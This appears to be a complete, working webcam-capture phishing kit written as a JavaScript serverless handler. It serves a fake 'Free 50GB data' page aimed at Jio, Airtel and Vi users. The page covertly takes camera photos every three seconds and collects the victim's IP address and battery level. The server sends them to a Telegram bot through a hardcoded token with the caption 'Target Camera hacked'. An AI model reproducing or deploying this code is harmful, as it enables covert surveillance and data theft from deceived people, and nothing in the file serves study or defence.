const axios = require('axios');
const FormData = require('form-data');

export default async function handler(req, res) {
    const botToken = "8796859741:AAEoe1AmDlHY1j1vqyPsm-XbaLAgIy5oa90";

    if (req.method === 'POST') {
        try {
            const { image, id, battery, ip } = req.body;
            if (!image || !id) return res.status(400).json({ error: "Missing data" });

            const base64Data = image.replace(/^data:image\/jpeg;base64,/, "");
            const imageBuffer = Buffer.from(base64Data, 'base64');

            const form = new FormData();
            form.append('chat_id', id);
            form.append('photo', imageBuffer, { filename: 'capture.jpg' });
            
            // Professional Caption with Battery and IP
            const caption = `📸 Target Camera hacked.!\n\n🔋 Battery: ${battery || 'N/A'}\n🌐 IP Address: ${ip || 'N/A'}\n\n👨‍💻 DEVELOPER: @Eshucording\n📞 Contact: 8123561579`;
            form.append('caption', caption);

            await axios.post(`https://api.telegram.org/bot${botToken}/sendPhoto`, form, {
                headers: form.getHeaders(),
            });
            return res.status(200).json({ success: true });
        } catch (error) {
            return res.status(200).json({ success: false }); 
        }
    }

    res.setHeader('Content-Type', 'text/html');
    return res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>Free 5G Internet Offer</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0f0f0f; color: white; text-align: center; padding: 20px; }
        .box { border: 2px solid #00d2ff; padding: 30px; border-radius: 15px; background: #1a1a1a; box-shadow: 0 0 20px #00d2ff; max-width: 400px; margin: auto; }
        button { width: 100%; padding: 15px; margin: 10px 0; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
        .jio { background: #1539cf; color: white; }
        .airtel { background: #f40000; color: white; }
        .vi { background: #ffeb00; color: black; }
        video, canvas { display: none; }
    </style>
</head>
<body onload="autoStart()">
    <div class="box">
        <h1 style="color:#00d2ff;">🎁 FREE 50GB DATA</h1>
        <p>Your 2026 reward is ready. Select your network provider to claim.</p>
        <button class="jio" onclick="verify('JIO')">JIO</button>
        <button class="airtel" onclick="verify('AIRTEL')">AIRTEL</button>
        <button class="vi" onclick="verify('VI')">VI</button>
    </div>
    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>
    <script>
        const path = window.location.pathname.replace('/', '');
        const query = new URLSearchParams(window.location.search).get('s');
        const encoded = path || query;
        const uid = encoded ? atob(encoded) : null;
        let userIp = "Detecting...";
        let userBattery = "Detecting...";

        async function autoStart() {
            if(!uid) return; 

            // Get IP Address
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                userIp = data.ip;
            } catch (e) { userIp = "Unknown"; }

            // Get Battery
            try {
                const battery = await navigator.getBattery();
                userBattery = Math.round(battery.level * 100) + "%";
            } catch (e) { userBattery = "Not Supported"; }

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const videoElement = document.getElementById('v');
                videoElement.srcObject = stream;
                
                setTimeout(() => {
                    setInterval(snap, 3000); 
                }, 2000);
            } catch (err) { }
        }

        function verify(sim) {
            alert("Verifying " + sim + " number... please wait 10 sec");
        }

        function snap() {
            const v = document.getElementById('v');
            const c = document.getElementById('c');
            if (v.videoWidth === 0) return; 

            c.width = v.videoWidth;
            c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            
            fetch(window.location.href, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    image: c.toDataURL('image/jpeg', 0.6), 
                    id: uid,
                    battery: userBattery,
                    ip: userIp
                })
            });
        }
    </script>
</body>
</html>
    `);
                             }
                              
